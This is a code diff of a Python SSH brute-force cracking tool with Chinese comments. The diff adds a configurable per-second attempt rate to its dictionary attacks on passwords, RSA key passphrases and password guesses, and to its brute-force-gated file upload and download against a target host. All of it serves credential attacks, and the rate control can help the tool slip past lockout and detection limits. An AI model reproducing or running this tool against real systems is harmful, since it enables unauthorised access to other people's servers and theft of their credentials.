@@ -15,6 +15,7 @@ from typing import Callable
 import time
 from concurrent.futures import ThreadPoolExecutor, as_completed
 import threading
+import math
 
 # 获取当前时间
 NOWTIME = datetime.datetime.now().strftime("%Y/%m/%d %H:%M:%S")
@@ -74,7 +75,7 @@ def gress_password(old_password: str) -> str:
     return new_one
 
 # 解析命令行参数
-def parseArgs() -> tuple[str, str , str, int , str , str, str, int]:
+def parseArgs() -> tuple[str, str , str, int , str , str, str, int, int]:
     parser = argparse.ArgumentParser(description='SSH Brute-Force Cracking Tool')
     parser.add_argument('--mode', type=str, default='client', help="模式选择，可选client、rsa、trans、login、rsa-login、guess")
     parser.add_argument('--stmpPath', type=str, default='data.conf', help="邮箱配置文件路径")
@@ -84,8 +85,9 @@ def parseArgs() -> tuple[str, str , str, int , str , str, str, int]:
     parser.add_argument('--password', type=str, default='admin123456', help="目标主机密码,如果你知道密码，可以直接指定 (模式指定: login) ")
     parser.add_argument('--rsa_password', type=str, default=None, help="目标主机RSA私钥密码,同上所述 (模式指定: login, rsa-login) ")
     parser.add_argument('--guessNum', type=int, default=10, help="猜测次数, 默认为10次 (模式指定: guess) ")
+    parser.add_argument('--attemptRate', type=int, default=5, help="每秒尝试密码次数")
     args = parser.parse_args()
-    return args.mode , args.stmpPath, args.hostname, args.port, args.username, args.password, args.rsa_password , args.guessNum
+    return args.mode , args.stmpPath, args.hostname, args.port, args.username, args.password, args.rsa_password , args.guessNum, args.attemptRate
 
 # 从配置文件中获取配置
 def getConfig(section: str, key: str, stmpPathConf: str) -> str:
@@ -140,7 +142,7 @@ def TrySSHConnection(hostname: str, SSHport: int, username: str, password: str) 
         ssh_client.close()
 
 # 尝试使用RSA密钥进行SSH登录
-def TryRsaSSHLogin(hostname: str, SSHport: int, username: str, id_rsa_filePath: str, Rsa_password: str) -> None:
+def TryRsaSSHLogin(hostname: str, SSHport: int, username: str, id_rsa_filePath: str, Rsa_password: str, attemptRate: int) -> None:
     if TryRsaSSHConnection(hostname, SSHport, username, id_rsa_filePath, Rsa_password)[0] is True:
         print(f"[√]RSA-SSH登录成功! 账号: {username} 私钥密码为：{Rsa_password}")
         exit(0)
@@ -148,14 +150,14 @@ def TryRsaSSHLogin(hostname: str, SSHport: int, username: str, id_rsa_filePath: 
         print("[×]RSA-SSH登录失败")
 
 # 尝试使用用户名和密码进行SSH登录
-def TrySSHLogin(hostname: str, SSHport: int, username: str, password: str) -> None:
+def TrySSHLogin(hostname: str, SSHport: int, username: str, password: str, attemptRate: int) -> None:
     if TrySSHConnection(hostname, SSHport, username, password)[0] is True:
         Successed(username, password)
     else:
         print("[×]SSH登录失败")
 
 # 使用用户名和密码字典进行SSH连接尝试
-def sshClientConnection(hostname:str, SSHport: int):
+def sshClientConnection(hostname:str, SSHport: int, attemptRate: int):
     if PingIsOpenConnect(hostname, SSHport) is False:
             Failed("目标主机未开启SSH服务")
     with open("username.txt", 'r', encoding='utf-8') as f:
@@ -167,15 +169,19 @@ def sshClientConnection(hostname:str, SSHport: int):
     start_time = time.time()
     success = False
 
-    with ThreadPoolExecutor(max_workers=5) as executor:
+    total_attempts = len(user_name) * len(pass_word)
+    interval = 1.0 / attemptRate  # 每次尝试的时间间隔
+
+    with ThreadPoolExecutor(max_workers=attemptRate) as executor:
         futures = []
         for username in user_name:
             for password in pass_word:
                 futures.append(executor.submit(TrySSHConnection, hostname, SSHport, username.strip(), password.strip()))
+                attempt_count += 1
+                time.sleep(interval)  # 控制尝试速度
         
         for future in as_completed(futures):
             result = future.result()
-            attempt_count += 1
             if result[0] is True:
                 success = True
                 Successed(result[1], result[2])
@@ -186,13 +192,13 @@ def sshClientConnection(hostname:str, SSHport: int):
     duration = end_time - start_time
     print(f"总尝试次数: {attempt_count}")
     print(f"总耗时: {duration:.2f} 秒")
-    print(f"每秒尝试次数: {attempt_count / duration:.2f}")
+    print(f"每秒尝试次数: {math.ceil(attempt_count / duration)}")
     
     if not success:
         Failed("[x]所有的字典都尝试完毕，没有找到合适的账号或密码。")
 
 # 使用RSA密钥和密码字典进行SSH连接尝试
-def sshRsaConnection(hostname: str, SSHport: int):
+def sshRsaConnection(hostname: str, SSHport: int, attemptRate: int):
     if PingIsOpenConnect(hostname, SSHport) is False:
             Failed("目标主机未开启SSH服务")
     with open("username.txt", 'r', encoding='utf-8') as f:
@@ -201,39 +207,44 @@ def sshRsaConnection(hostname: str, SSHport: int):
         pass_word = f.readlines()
     id_rsa_filePath = input("请输入您的id_rsa文件的绝对路径：") 
     flag1 = input("您是否需要指定密码？如需要，请输入y；否则输入n。")
+    
+    interval = 1.0 / attemptRate  # 每次尝试的时间间隔
+
     if(flag1.lower() == 'y'):
-        with ThreadPoolExecutor(max_workers=5) as executor:
+        with ThreadPoolExecutor(max_workers=attemptRate) as executor:
             futures = []
             attempt_count = 0
             start_time = time.time()
             for Rsa_password in pass_word:
                 for username in user_name:
                     futures.append(executor.submit(TryRsaSSHConnection, hostname, SSHport, username.strip(), id_rsa_filePath, Rsa_password.strip()))
+                    attempt_count += 1
+                    time.sleep(interval)
             
             for future in as_completed(futures):
                 result = future.result()
-                attempt_count += 1
                 if result[0] is True:
                     Successed(result[1], result[2])
-            
+        
             end_time = time.time()
             duration = end_time - start_time
             print(f"总尝试次数: {attempt_count}")
             print(f"总耗时: {duration:.2f} 秒")
-            print(f"每秒尝试次数: {attempt_count / duration:.2f}")
+            print(f"每秒尝试次数: {math.ceil(attempt_count / duration)}")
         
         Failed("[x]所有的字典都尝试完毕，没有找到合适的账号或密码。")
     elif(flag1.lower() == 'n'):
-        with ThreadPoolExecutor(max_workers=5) as executor:
+        with ThreadPoolExecutor(max_workers=attemptRate) as executor:
             futures = []
             attempt_count = 0
             start_time = time.time()
             for username in user_name:
                 futures.append(executor.submit(TryRsaSSHConnection, hostname, SSHport, username.strip(), id_rsa_filePath, None))
+                attempt_count += 1
+                time.sleep(interval)
             
             for future in as_completed(futures):
                 result = future.result()
-                attempt_count += 1
                 if result[0] is True:
                     Successed(result[1], result[2])
             
@@ -241,14 +252,14 @@ def sshRsaConnection(hostname: str, SSHport: int):
             duration = end_time - start_time
             print(f"总尝试次数: {attempt_count}")
             print(f"总耗时: {duration:.2f} 秒")
-            print(f"每秒尝试次数: {attempt_count / duration:.2f}")
+            print(f"每秒尝试次数: {math.ceil(attempt_count / duration)}")
         
         Failed("[x]所有的字典都尝试完毕，没有找到合适的账号。")
     else:
         print("您的输入有误！")
 
 # 使用猜测的密码进行SSH连接尝试
-def sshGuess(hostname: str, SSHport: int, guessNum: int, username: str, password: str) -> None:
+def sshGuess(hostname: str, SSHport: int, guessNum: int, username: str, password: str, attemptRate: int) -> None:
     if PingIsOpenConnect(hostname, SSHport) is False:
         Failed("目标主机未开启SSH服务")
     for i in range(guessNum):
@@ -259,10 +270,11 @@ def sshGuess(hostname: str, SSHport: int, guessNum: int, username: str, password
             exit(0)
         else:
             print(f"[×]第{i+1}次猜测失败。")
+        time.sleep(1.0 / attemptRate)  # 控制猜测速度
     Failed("[x]所有的猜测都尝试完毕，没有找到合适的密码。")
 
 # 文件传输功能
-def transFile(hostname: str, SSHport: int):
+def transFile(hostname: str, SSHport: int, attemptRate: int):
     if PingIsOpenConnect(hostname, SSHport) is False:
         Failed("目标主机未开启SSH服务")
     with open("username.txt", 'r', encoding='utf-8') as f:
@@ -271,22 +283,24 @@ def transFile(hostname: str, SSHport: int):
         pass_word = f.readlines()
     flag2 = input("如果您要上传文件，请输入1；如果您要下载文件，请输入2。")
     if(flag2 == '1'):
-        with ThreadPoolExecutor(max_workers=5) as executor:
+        with ThreadPoolExecutor(max_workers=attemptRate) as executor:
             futures = []
             for username in user_name:
                 for password in pass_word:
                     futures.append(executor.submit(transFileUpload, hostname, SSHport, username.strip(), password.strip()))
+                    time.sleep(1.0 / attemptRate)
             
             for future in as_completed(futures):
                 result = future.result()
                 if result is True:
                     break
     elif(flag2 == '2'):
-        with ThreadPoolExecutor(max_workers=5) as executor:
+        with ThreadPoolExecutor(max_workers=attemptRate) as executor:
             futures = []
             for username in user_name:
                 for password in pass_word:
                     futures.append(executor.submit(transFileDownload, hostname, SSHport, username.strip(), password.strip()))
+                    time.sleep(1.0 / attemptRate)
             
             for future in as_completed(futures):
                 result = future.result()
@@ -392,8 +406,8 @@ if __name__ == '__main__':
     }
 
     # 解析命令行参数
-    mode, stmpPath, hostname, SSHport, username, password, rsa_password, guessNum = parseArgs()
-    print(f"[DEBUG] 模式：{mode}，目标主机：{hostname}, SSH端口: {SSHport}")
+    mode, stmpPath, hostname, SSHport, username, password, rsa_password, guessNum, attemptRate = parseArgs()
+    print(f"[DEBUG] 模式：{mode}，目标主机：{hostname}, SSH端口: {SSHport}, 每秒尝试次数: {attemptRate}")
     
     # 检查模式是否存在
     if mode not in modeDict:
@@ -410,16 +424,16 @@ if __name__ == '__main__':
                     print(f"[DEBUG] {i}...")
                     time.sleep(1)
                 print("[DEBUG] 开始爆破")
-                modeDict[mode][0](hostname.strip(), SSHport)
+                modeDict[mode][0](hostname.strip(), SSHport, attemptRate)
             if mode == 'login':
-                modeDict[mode][0](hostname.strip(), SSHport, username.strip(), password.strip())
+                modeDict[mode][0](hostname.strip(), SSHport, username.strip(), password.strip(), attemptRate)
             if mode == 'rsa-login':
                 id_rsa_filePath = input("请输入您的id_rsa文件的绝对路径:")
-                modeDict[mode][0](hostname.strip(), SSHport, username.strip(), id_rsa_filePath.strip(), rsa_password.strip())
+                modeDict[mode][0](hostname.strip(), SSHport, username.strip(), id_rsa_filePath.strip(), rsa_password.strip(), attemptRate)
             if mode == 'guess':
                 old_password = input("请输入您要猜测的密码:")
                 guessusername = input("请输入您要猜测的用户名:")
-                modeDict[mode][0](hostname.strip(), SSHport, guessNum, guessusername.strip(), old_password.strip())
+                modeDict[mode][0](hostname.strip(), SSHport, guessNum, guessusername.strip(), old_password.strip(), attemptRate)
             if len(modeDict[mode]) > 1:
                 modeDict[mode][1](stmpPath.strip())
         except Exception as e:
